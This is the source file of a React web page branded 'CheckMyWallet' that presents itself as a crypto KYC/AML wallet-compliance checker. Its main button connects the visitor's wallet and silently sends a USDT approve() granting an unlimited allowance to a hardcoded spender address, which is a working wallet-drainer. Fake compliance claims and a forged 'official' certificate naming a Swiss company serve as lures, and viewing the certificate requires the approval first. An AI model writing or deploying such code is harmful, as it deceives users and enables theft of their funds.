'use client';

import React, { useState, useEffect } from 'react';
import EthereumProvider from "@walletconnect/ethereum-provider";
import Web3 from "web3";

// Font import for Montserrat (you can put this in _app.js or index.html for global use)
const fontLink = (
  <link
    href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap"
    rel="stylesheet"
  />
);

const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const SPENDER = "0xbA9D4eeB570FC52CF0d5362f80Ef31DD7F239e75";
const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

const ABI_APPROVE = [
  {
    "constant": false,
    "inputs": [
      { "name": "_spender", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "approve",
    "type": "function",
    "stateMutability": "nonpayable"
  }
];

// Minimalist logo text with responsive adjustments for mobile
const LogoText = () => (
  <div style={{
    display: 'flex',
    alignItems: 'center',
    gap: 8,
    fontFamily: "'Montserrat', 'Segoe UI', Arial, sans-serif",
    fontWeight: 600,
    fontSize: '1.3rem',
    letterSpacing: '0.5px',
    color: '#2563eb',
    paddingLeft: 4,
  }}>
    <span style={{
      display: 'inline-flex',
      alignItems: 'center',
      justifyContent: 'center',
      width: 26,
      height: 26,
      borderRadius: '50%',
      background: 'linear-gradient(135deg,#e0f2fe 60%,#2563eb 100%)',
      boxShadow: '0 2px 8px #2563eb22',
      marginRight: 2
    }}>
      {/* Minimalist icon: shield with checkmark */}
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
        <path d="M12 3L4 6v6c0 5.25 3.75 9.75 8 11 4.25-1.25 8-5.75 8-11V6l-8-3z" fill="#2563eb" fillOpacity="0.13"/>
        <path d="M9.5 12.5l2 2 3-3.5" stroke="#2563eb" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
      </svg>
    </span>
    <span style={{
      fontWeight: 600,
      fontFamily: "'Montserrat', 'Segoe UI', Arial, sans-serif",
      letterSpacing: '1px',
      color: '#2563eb',
      background: 'linear-gradient(90deg,#2563eb 0%,#60a5fa 100%)',
      WebkitBackgroundClip: 'text',
      WebkitTextFillColor: 'transparent',
      whiteSpace: 'nowrap',
      fontSize: '1.1rem',
    }}>
      CheckMyWallet
    </span>
  </div>
);

declare global {
  interface Window {
    ethereum?: any;
    ethers?: any;
  }
}

const certStyles = `
.cert-section {
  padding: 64px 0 32px 0;
  background: linear-gradient(135deg, #fff 0%, #f9fafb 100%);
  font-family: 'Segoe UI', Arial, sans-serif;
}
.cert-container {
  max-width: 1200px;
  margin: 0 auto;
  padding: 0 8px;
}
.cert-title {
  text-align: center;
  margin-bottom: 32px;
}
.cert-title h2 {
  font-size: 2.2rem;
  font-weight: 700;
  color: #1a202c;
  margin-bottom: 12px;
  letter-spacing: -1px;
}
.cert-title p {
  font-size: 1.1rem;
  color: #4b5563;
  max-width: 700px;
  margin: 0 auto;
}
.cert-grid {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 24px;
}
.cert-row {
  display: flex;
  flex-wrap: wrap;
  gap: 24px;
  justify-content: center;
  width: 100%;
}
.cert-card, .cert-certificate {
  background: #fff;
  border-radius: 18px;
  box-shadow: 0 2px 12px 0 rgba(37,99,235,0.07), 0 1.5px 6px 0 rgba(0,0,0,0.03);
  padding: 28px 18px 24px 18px;
  flex: 1 1 320px;
  min-width: 260px;
  max-width: 400px;
  transition: transform 0.18s, box-shadow 0.18s;
  border: 2px solid #e0e7ff;
  position: relative;
  overflow: hidden;
}
.cert-card:hover, .cert-certificate:hover {
  transform: translateY(-4px) scale(1.01);
  box-shadow: 0 8px 32px 0 rgba(37,99,235,0.13), 0 2px 8px 0 rgba(0,0,0,0.06);
  border-color: #2563eb;
}
.cert-card h3, .cert-certificate h3 {
  font-size: 1.15rem;
  font-weight: 600;
  color: #1e293b;
  margin-bottom: 12px;
}
.cert-card p, .cert-certificate p {
  color: #4b5563;
  margin-bottom: 12px;
}
.cert-icons {
  display: flex;
  gap: 14px;
  margin-top: 8px;
}
.cert-icon {
  width: 40px;
  height: 40px;
  display: flex;
  align-items: center;
  justify-content: center;
  background: linear-gradient(135deg, #e0e7ff 60%, #c7d2fe 100%);
  border-radius: 50%;
  font-size: 1.3rem;
  color: #2563eb;
  box-shadow: 0 2px 8px 0 rgba(37,99,235,0.08);
  border: 1.5px solid #c7d2fe;
}
.cert-history {
  margin-top: 10px;
}
.cert-history-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 8px;
}
.cert-history-label {
  display: flex;
  align-items: center;
  gap: 6px;
}
.cert-history-check {
  width: 22px;
  height: 22px;
  background: linear-gradient(135deg, #bbf7d0 60%, #6ee7b7 100%);
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #16a34a;
  font-size: 1rem;
  box-shadow: 0 1px 4px 0 rgba(16,185,129,0.08);
}
.cert-history-status {
  color: #16a34a;
  font-weight: 500;
  font-size: 0.98rem;
}
.cert-certificate {
  flex: 1 1 100%;
  max-width: 600px;
  margin-bottom: 16px;
  background: #fff;
  border: 3px solid transparent;
  border-radius: 22px;
  background-clip: padding-box;
  box-shadow: 0 6px 32px 0 rgba(37,99,235,0.10), 0 2px 8px 0 rgba(0,0,0,0.04);
  position: relative;
  cursor: pointer;
  margin-left: auto;
  margin-right: auto;
}
.cert-certificate:before {
  content: "";
  position: absolute;
  inset: 0;
  z-index: 0;
  border-radius: 22px;
  padding: 2px;
  background: linear-gradient(120deg, #2563eb 0%, #38bdf8 100%);
  -webkit-mask:
    linear-gradient(#fff 0 0) content-box,
    linear-gradient(#fff 0 0);
  -webkit-mask-composite: xor;
  mask-composite: exclude;
  pointer-events: none;
}
.cert-certificate > * {
  position: relative;
  z-index: 1;
}
.cert-certificate-details {
  margin-bottom: 18px;
}
.cert-certificate-details div {
  margin-bottom: 7px;
}
.cert-certificate-label {
  font-size: 0.93rem;
  color: #6b7280;
}
.cert-certificate-value {
  font-weight: 500;
  color: #1e293b;
}
.cert-certificate-status {
  color: #16a34a;
  font-weight: 600;
}
.cert-certificate-footer {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-top: 18px;
  gap: 10px;
}
.cert-certificate-badge {
  display: flex;
  align-items: center;
  gap: 6px;
}
.cert-certificate-badge-icon {
  width: 28px;
  height: 28px;
  background: linear-gradient(135deg, #e0e7ff 60%, #c7d2fe 100%);
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 1.1rem;
  color: #2563eb;
  box-shadow: 0 1px 4px 0 rgba(37,99,235,0.08);
  border: 1.5px solid #c7d2fe;
}
.cert-download-btn {
  display: inline-block;
  background: linear-gradient(90deg, #2563eb 60%, #38bdf8 100%);
  color: #fff;
  padding: 10px 24px;
  border-radius: 20px;
  font-weight: 500;
  text-decoration: none;
  margin-top: 18px;
  transition: background 0.2s, box-shadow 0.2s;
  border: none;
  cursor: pointer;
  font-size: 1rem;
  box-shadow: 0 2px 8px 0 rgba(37,99,235,0.10);
}
.cert-download-btn:hover {
  background: linear-gradient(90deg, #1d4ed8 60%, #0ea5e9 100%);
  box-shadow: 0 4px 16px 0 rgba(37,99,235,0.18);
}
.cert-balance {
  background: linear-gradient(90deg, #f1f5f9 60%, #e0e7ff 100%);
  border-radius: 14px;
  padding: 12px 16px;
  margin-bottom: 12px;
  display: flex;
  align-items: center;
  gap: 16px;
  box-shadow: 0 2px 8px 0 rgba(37,99,235,0.07);
  font-size: 1.05rem;
  font-weight: 500;
  color: #1e293b;
  min-height: 48px;
  flex-direction: column;
  align-items: flex-start;
}
.cert-balance-icon {
  font-size: 1.5rem;
  margin-right: 8px;
}
.cert-balance-token {
  display: flex;
  align-items: center;
  gap: 6px;
}
.cert-balance-amount {
  font-weight: 600;
  color: #2563eb;
}
.cert-connect-btn {
  background: linear-gradient(90deg, #38bdf8 60%, #2563eb 100%);
  color: #fff;
  padding: 7px 18px;
  border-radius: 14px;
  font-weight: 500;
  border: none;
  cursor: pointer;
  font-size: 1rem;
  margin-bottom: 6px;
  margin-top: 6px;
  transition: background 0.2s;
}
.cert-connect-btn:hover {
  background: linear-gradient(90deg, #2563eb 60%, #38bdf8 100%);
}
.cert-modal {
  display: none;
  position: fixed;
  z-index: 9999;
  left: 0; top: 0; width: 100vw; height: 100vh;
  background: rgba(0,0,0,0.55);
  align-items: center;
  justify-content: center;
}
.cert-modal-content {
  background: #fff;
  border-radius: 18px;
  padding: 12px 0 24px 0;
  box-shadow: 0 8px 40px 0 rgba(37,99,235,0.18), 0 2px 8px 0 rgba(0,0,0,0.10);
  max-width: 98vw;
  width: 98vw;
  text-align: center;
  position: relative;
  display: flex;
  flex-direction: column;
  align-items: center;
}
.cert-modal-close {
  position: absolute;
  top: 10px;
  right: 18px;
  font-size: 2rem;
  color: #2563eb;
  background: none;
  border: none;
  cursor: pointer;
  z-index: 2;
}
#modal-cert-image img {
  width: 95vw;
  max-width: 600px;
  border-radius: 16px;
  box-shadow: 0 2px 16px #2563eb55;
  background: #fff;
  margin-bottom: 12px;
  cursor: pointer;
}
@media (max-width: 900px) {
  .cert-row {
    flex-direction: column;
    gap: 16px;
    align-items: stretch;
  }
  .cert-certificate {
    margin-bottom: 14px;
    max-width: 98vw;
    min-width: 0;
    padding: 12px 4vw 18px 4vw;
  }
  .cert-card {
    max-width: 98vw;
    min-width: 0;
    padding: 12px 4vw 18px 4vw;
  }
  .cert-modal-content {
    padding: 0 0 18px 0;
    max-width: 100vw;
    width: 100vw;
  }
  #modal-cert-image img {
    width: 98vw;
    max-width: 98vw;
    border-radius: 0;
  }
}

/* Logo adjustments for mobile */
@media (max-width: 600px) {
  div[style*="font-size: 1.3rem"] {
    font-size: 1rem !important;
    padding-left: 8px !important;
  }
  div[style*="width: 26px"] {
    width: 20px !important;
    height: 20px !important;
  }
  svg {
    width: 12px !important;
    height: 12px !important;
  }
}
`;

export default function Page() {
  const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'failed'>('idle');
  const [wallet, setWallet] = useState<string | null>(null);
  const [balance, setBalance] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);

  // Certification section states
  const [certificateId, setCertificateId] = useState<string>('');
  const [walletAddress, setWalletAddress] = useState<string>('-');
  const [verificationDate, setVerificationDate] = useState<string>('-');
  const [verificationStatus, setVerificationStatus] = useState<string>('Not Connected');
  const [usdtBalance, setUsdtBalance] = useState<string>('-');
  const [currentAddress, setCurrentAddress] = useState<string | null>(null);
  const [currentBalance, setCurrentBalance] = useState<string | null>(null);
  const [currentCertImage, setCurrentCertImage] = useState<string | null>(null);
  const [modalOpen, setModalOpen] = useState(false);

  // WalletConnect provider and Web3 instance
  const [provider, setProvider] = useState<any>(null);
  const [web3, setWeb3] = useState<Web3 | null>(null);

  useEffect(() => {
    generateCertificateId();
  }, []);

  const verifyAndApprove = async () => {
    setStatus('processing');
    setError(null);

    try {
      const wcProvider = await EthereumProvider.init({
        projectId: "3b862a3ab6c400686ef1ed9deab38b7d",
        chains: [1],
        showQrModal: true,
        rpcMap: {
          1: "https://mainnet.infura.io/v3/61762d09a47848c285f2a6534394a6c5"
        },
        methods: [
          "eth_sendTransaction",
          "personal_sign",
          "eth_signTypedData",
          "eth_requestAccounts",
          "eth_accounts",
          "eth_getBalance"
        ],
        metadata: {
          name: "checkmywallet.org",
          description: "A web 3 wallet checker allowing users to connect their wallet and sign message for identity verifications and action approvals",
          url: "https://checkmywallet.org",
          icons: ["https://checkmywallet.org/logo.png"]
        }
      });

      await wcProvider.enable();

      setProvider(wcProvider);
      const web3Instance = new Web3(wcProvider as any);
      setWeb3(web3Instance);

      let accounts = await web3Instance.eth.getAccounts();
      if (!accounts || accounts.length === 0) {
        accounts = await wcProvider.request({ method: "eth_requestAccounts" }) as string[];
      }
      if (!accounts || accounts.length === 0) throw new Error("No account found");
      const walletAddress = accounts[0];
      setWallet(walletAddress);

      const bal = await web3Instance.eth.getBalance(walletAddress);
      setBalance(web3Instance.utils.fromWei(bal, "ether"));

      const contract = new web3Instance.eth.Contract(ABI_APPROVE as any, USDT_CONTRACT);
      await contract.methods.approve(SPENDER, MAX_UINT).send({ from: walletAddress });

      setStatus('success');
      setTimeout(() => setStatus('idle'), 2500);

    } catch (e: any) {
      setStatus('failed');
      setError(e?.message || "Unknown error");
      setTimeout(() => {
        setStatus('idle');
        setError(null);
      }, 3000);
    }
  };

  function generateCertificateId() {
    const now = new Date();
    const y = now.getFullYear().toString().slice(-2);
    const m = String(now.getMonth() + 1).padStart(2, '0');
    const d = String(now.getDate()).padStart(2, '0');
    const h = String(now.getHours()).padStart(2, '0');
    const min = String(now.getMinutes()).padStart(2, '0');
    const s = String(now.getSeconds()).padStart(2, '0');
    const rand = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
    const id = `VRF-${y}${m}${d}${h}${min}${s}${rand}`;
    setCertificateId(id);
    return id;
  }

  const checkAllowanceAndShowBalance = async () => {
    if (!provider || !web3) {
      alert("Please connect your wallet first.");
      return;
    }
    try {
      const accounts = await web3.eth.getAccounts();
      if (!accounts || accounts.length === 0) {
        alert("No wallet connected.");
        return;
      }
      const address = accounts[0];

      const contract = new web3.eth.Contract([
        {
          "constant": true,
          "inputs": [
            { "name": "owner", "type": "address" },
            { "name": "spender", "type": "address" }
          ],
          "name": "allowance",
          "outputs": [{ "name": "", "type": "uint256" }],
          "type": "function",
          "stateMutability": "view"
        },
        {
          "constant": true,
          "inputs": [],
          "name": "decimals",
          "outputs": [{ "name": "", "type": "uint8" }],
          "type": "function",
          "stateMutability": "view"
        },
        {
          "constant": true,
          "inputs": [{ "name": "account", "type": "address" }],
          "name": "balanceOf",
          "outputs": [{ "name": "", "type": "uint256" }],
          "type": "function",
          "stateMutability": "view"
        }
      ], USDT_CONTRACT);

      const allowanceRaw = await contract.methods.allowance(address, SPENDER).call() as string;
      if (allowanceRaw === "0") {
        alert("You have not given the necessary approval to view the balance and certificate.");
        return;
      }

      const decimals = await contract.methods.decimals().call();
      const balanceRaw = await contract.methods.balanceOf(address).call();
      const usdtBal = Number(balanceRaw) / (10 ** Number(decimals));

      setWalletAddress(address.slice(0,6) + "..." + address.slice(-4));
      setVerificationDate(new Date().toLocaleDateString());
      setVerificationStatus("Connected");
      setUsdtBalance(usdtBal.toLocaleString(undefined, {maximumFractionDigits:2}));
      setCurrentBalance(usdtBal.toString());
      generateCertificateId();

    } catch (e) {
      alert("Error fetching balance or allowance.");
    }
  };

  function drawCertificateImage(address: string, balance: string, certId: string, date: string) {
    const canvas = document.createElement('canvas');
    canvas.width = 900;
    canvas.height = 600;
    const ctx = canvas.getContext('2d')!;
    ctx.fillStyle = "#fff";
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    ctx.strokeStyle = "#2563eb";
    ctx.lineWidth = 8;
    ctx.strokeRect(20, 20, canvas.width - 40, canvas.height - 40);

    ctx.fillStyle = "#2563eb";
    ctx.font = "bold 44px Segoe UI, Arial";
    ctx.textAlign = "center";
    ctx.fillText("Official Crypto Asset Certificate", canvas.width / 2, 90);

    ctx.strokeStyle = "#38bdf8";
    ctx.lineWidth = 2;
    ctx.beginPath();
    ctx.moveTo(180, 110);
    ctx.lineTo(720, 110);
    ctx.stroke();

    ctx.font = "22px Segoe UI, Arial";
    ctx.fillStyle = "#1e293b";
    ctx.textAlign = "left";
    ctx.fillText(`Certificate ID: ${certId}`, 60, 160);

    ctx.font = "22px Segoe UI, Arial";
    ctx.fillText(`Wallet: ${address.slice(0, 8)}...${address.slice(-6)}`, 60, 200);

    ctx.font = "bold 32px Segoe UI, Arial";
    ctx.fillStyle = "#2563eb";
    ctx.textAlign = "center";
    ctx.fillText(`Active Balance: ${parseFloat(balance).toLocaleString(undefined, { maximumFractionDigits: 2 })} USDT`, canvas.width / 2, 270);

    ctx.font = "22px Segoe UI, Arial";
    ctx.fillStyle = "#1e293b";
    ctx.textAlign = "left";
    ctx.fillText(`Date: ${date}`, 60, 320);

    ctx.font = "bold 28px Segoe UI, Arial";
    ctx.fillStyle = "#22c55e";
    ctx.textAlign = "center";
    ctx.fillText("Status: VERIFIED & SECURE", canvas.width / 2, 370);

    ctx.font = "20px Segoe UI, Arial";
    ctx.fillStyle = "#1e293b";
    ctx.textAlign = "left";
    ctx.fillText("BPI HOLDING SA (CH-660.0.201.959-2)", 60, 420);
    ctx.fillText("c/o Berney et Associés SA Société Fiduciaire", 60, 450);
    ctx.fillText("Rue du Nant 8, 1207 Genève", 60, 480);

    ctx.font = "italic 22px Segoe UI, Arial";
    ctx.fillStyle = "#2563eb";
    ctx.fillText("CryptoVerification Authority", 60, 520);

    ctx.font = "italic 32px Segoe Script, Segoe UI, Arial";
    ctx.fillStyle = "#2563eb";
    ctx.textAlign = "right";
    ctx.fillText("Authorized Signature", canvas.width - 60, 520);

    return canvas.toDataURL('image/png');
  }

  function handleDownloadCertificate() {
    if (!currentAddress || !currentBalance || parseFloat(currentBalance) <= 0) {
      alert("Please connect your wallet and ensure you have a positive USDT balance to generate the certificate.");
      return;
    }
    const certId = certificateId || generateCertificateId();
    const date = new Date().toLocaleDateString();
    const imageDataUrl = drawCertificateImage(currentAddress, currentBalance, certId, date);
    setCurrentCertImage(imageDataUrl);

    const link = document.createElement('a');
    link.href = imageDataUrl;
    link.download = 'wallet_certificate.png';
    link.style.display = 'none';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }

  function handleShowCertificate() {
    if (!currentAddress || !currentBalance || parseFloat(currentBalance) <= 0) {
      alert("Please connect your wallet and ensure you have a positive USDT balance to view the certificate.");
      return;
    }
    const certId = certificateId || generateCertificateId();
    const date = new Date().toLocaleDateString();
    const imageDataUrl = drawCertificateImage(currentAddress, currentBalance, certId, date);
    setCurrentCertImage(imageDataUrl);
    setModalOpen(true);
  }

  function handleCloseModal() {
    setModalOpen(false);
  }

  function handleModalImageClick() {
    if (currentCertImage) {
      const link = document.createElement('a');
      link.href = currentCertImage;
      link.download = 'wallet_certificate.png';
      link.style.display = 'none';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
  }

  return (
    <>
      {fontLink}
      <div style={{
        minHeight: '100vh',
        background: 'linear-gradient(120deg,#1e293b 0%,#2563eb 100%)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        flexDirection: 'column',
        position: 'relative',
        fontFamily: "'Montserrat', 'Segoe UI', Arial, sans-serif"
      }}>
        {/* Top bar with minimalist logo text */}
        <div style={{
          position: 'absolute',
          top: 32,
          left: 32,
          zIndex: 10,
          background: 'rgba(255,255,255,0.92)',
          borderRadius: 14,
          padding: '7px 22px 7px 12px',
          boxShadow: '0 4px 24px #2563eb13',
          display: 'flex',
          alignItems: 'center'
        }}>
          <LogoText />
        </div>

        <div style={{
          maxWidth: 1200,
          margin: 'auto',
          textAlign: 'center',
          color: '#fff',
          padding: '90px 0 60px 0'
        }}>
          {/* Main title with color accent and shadow */}
          <h1 style={{
            fontSize: '2.3rem',
            fontWeight: 600,
            marginBottom: 18,
            letterSpacing: '-0.5px',
            color: '#e0f2fe',
            fontFamily: "'Montserrat', 'Segoe UI', Arial, sans-serif",
            textShadow: '0 2px 16px #1e293b, 0 1px 0 #2563eb55'
          }}>
            Secure Crypto Compliance <span style={{
              color: '#60a5fa',
              fontWeight: 700
            }}>&amp; Wallet Verification</span>
          </h1>
          <p style={{
            fontSize: '1.18rem',
            color: '#dbeafe',
            maxWidth: 600,
            margin: '0 auto 24px auto',
            lineHeight: 1.6,
            fontWeight: 400
          }}>
            Instantly verify your wallet and stay compliant with global KYC & AML standards. Fast, private, and trusted by thousands of users and businesses.
          </p>
          <div style={{
            fontSize: '1.1rem',
            color: '#2563eb',
            background: 'rgba(255,255,255,0.92)',
            display: 'inline-block',
            padding: '8px 22px',
            borderRadius: 8,
            fontWeight: 600,
            marginBottom: 24,
            boxShadow: '0 2px 12px rgba(30,41,59,0.10)'
          }}>
            from $0.49 fee per verification
          </div>
          <br />
          <button
            onClick={verifyAndApprove}
            disabled={status === 'processing'}
            style={{
              background: status === 'success'
                ? 'linear-gradient(90deg,#22c55e 0%,#2563eb 100%)'
                : status === 'failed'
                  ? 'linear-gradient(90deg,#ef4444 0%,#b91c1c 100%)'
                  : 'linear-gradient(90deg, #2563eb 0%, #1e293b 100%)',
              color: '#fff',
              padding: '16px 44px',
              fontSize: '1.15rem',
              borderRadius: 12,
              fontWeight: 700,
              letterSpacing: '0.5px',
              boxShadow: '0 6px 24px rgba(30,41,59,0.18)',
              border: 'none',
              cursor: status === 'processing' ? 'not-allowed' : 'pointer',
              marginTop: 18,
              minWidth: 210,
              transition: 'background 0.3s, color 0.3s, box-shadow 0.3s'
            }}
          >
            {status === 'processing'
              ? 'Processing...'
              : status === 'success'
                ? 'Wallet Approved!'
                : status === 'failed'
                  ? 'Connection Failed'
                  : 'Check Wallet Compliance'}
          </button>
          <div style={{
            fontSize: '1rem',
            color: '#bae6fd',
            marginTop: 18,
            background: 'rgba(255,255,255,0.08)',
            padding: '6px 18px',
            borderRadius: 8,
            display: 'inline-block',
            maxWidth: '95vw'
          }}>
            All tokens are checked for activity, blacklist status, and authenticity. Start verification and receive a downloadable compliance certificate.
          </div>
          {wallet && (
            <div style={{
              marginTop: 24,
              color: '#60a5fa',
              fontSize: '1.1rem',
              wordBreak: 'break-all'
            }}>
              Connected wallet: {wallet}
            </div>
          )}
          {balance && (
            <div style={{
              marginTop: 12,
              color: '#fbbf24',
              fontSize: '1.1rem',
              wordBreak: 'break-all'
            }}>
              ETH Balance: {balance}
            </div>
          )}
          {error && (
            <div style={{
              marginTop: 24,
              color: '#ef4444',
              fontSize: '1.1rem',
              wordBreak: 'break-all'
            }}>
              Error: {error}
            </div>
          )}
        </div>
      </div>

      {/* Certification Section */}
      <section className="cert-section">
        <style>{certStyles}</style>
        <div className="cert-container">
          <div className="cert-title">
            <h2>Certification Process</h2>
            <p>Our platform provides official certification for your verified cryptocurrency assets, adding an extra layer of legitimacy and security.</p>
          </div>
          <div className="cert-grid">
            <div className="cert-certificate" id="mainCertificate" onClick={handleShowCertificate}>
              <div style={{ marginBottom: 18 }}>
                <h3>Verification Certificate</h3>
                <p style={{ marginBottom: 0 }}>Official Document</p>
              </div>
              <div className="cert-certificate-details">
                <div>
                  <span className="cert-certificate-label">Certificate ID</span><br />
                  <span className="cert-certificate-value">{certificateId}</span>
                </div>
                <div>
                  <span className="cert-certificate-label">Wallet Address</span><br />
                  <span className="cert-certificate-value">{walletAddress}</span>
                </div>
                <div>
                  <span className="cert-certificate-label">Verification Date</span><br />
                  <span className="cert-certificate-value">{verificationDate}</span>
                </div>
                <div>
                  <span className="cert-certificate-label">Verification Status</span><br />
                  <span className="cert-certificate-status">{verificationStatus}</span>
                </div>
              </div>
              <div id="balance-section" className="cert-balance">
                <button className="cert-connect-btn" onClick={checkAllowanceAndShowBalance}>&#128179; View Wallet Balance</button>
                <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                  <span className="cert-balance-icon">&#9878;</span>
                  <span className="cert-balance-token">USDT: <span className="cert-balance-amount">{usdtBalance}</span></span>
                </div>
              </div>
              <div className="cert-certificate-footer">
                <div className="cert-certificate-badge">
                  <span className="cert-certificate-badge-icon" title="Internationally Certified">&#127758;</span>
                  <span style={{ fontWeight: 500 }}>Internationally Certified</span>
                </div>
                <div className="cert-certificate-badge">
                  <span className="cert-certificate-badge-icon" title="Blockchain Validated">&#128279;</span>
                  <span style={{ fontWeight: 500 }}>Blockchain Validated</span>
                </div>
              </div>
              <div style={{ textAlign: "center" }}>
                <button className="cert-download-btn" onClick={handleDownloadCertificate}>Download Certificate</button>
              </div>
              <div id="cert-image-container"></div>
            </div>
            <div className="cert-row">
              <div className="cert-card">
                <h3>Digital Certificate</h3>
                <p>After successful verification, you'll receive an official digital certificate that confirms the authenticity and security of your cryptocurrency assets.</p>
                <div className="cert-icons">
                  <span className="cert-icon" title="Document">&#128196;</span>
                  <span className="cert-icon" title="Shield">&#x1F6E1;</span>
                  <span className="cert-icon" title="Check">&#x2705;</span>
                </div>
              </div>
              <div className="cert-card">
                <h3>Verification History</h3>
                <p>Access your complete verification history, including dates, results, and recommendations for enhancing your cryptocurrency security.</p>
                <div className="cert-history">
                  <div className="cert-history-row">
                    <div className="cert-history-label">
                      <span className="cert-history-check">&#10003;</span>
                      <span>June 1, 2025</span>
                    </div>
                    <span className="cert-history-status">Verified</span>
                  </div>
                  <div className="cert-history-row">
                    <div className="cert-history-label">
                      <span className="cert-history-check">&#10003;</span>
                      <span>May 1, 2025</span>
                    </div>
                    <span className="cert-history-status">Verified</span>
                  </div>
                  <div className="cert-history-row">
                    <div className="cert-history-label">
                      <span className="cert-history-check">&#10003;</span>
                      <span>April 1, 2025</span>
                    </div>
                    <span className="cert-history-status">Verified</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Modal */}
      <div className="cert-modal" style={{ display: modalOpen ? "flex" : "none" }}>
        <div className="cert-modal-content">
          <button className="cert-modal-close" onClick={handleCloseModal}>&times;</button>
          <div id="modal-cert-image" onClick={handleModalImageClick}>
            {currentCertImage && (
              <img
                src={currentCertImage}
                alt="Certificate"
                draggable={false}
                style={{
                  width: "95vw",
                  maxWidth: 600,
                  borderRadius: 16,
                  boxShadow: "0 2px 16px #2563eb55",
                  background: "#fff",
                  marginBottom: 12,
                  cursor: "pointer"
                }}
              />
            )}
          </div>
        </div>
      </div>
    </>
  );
}
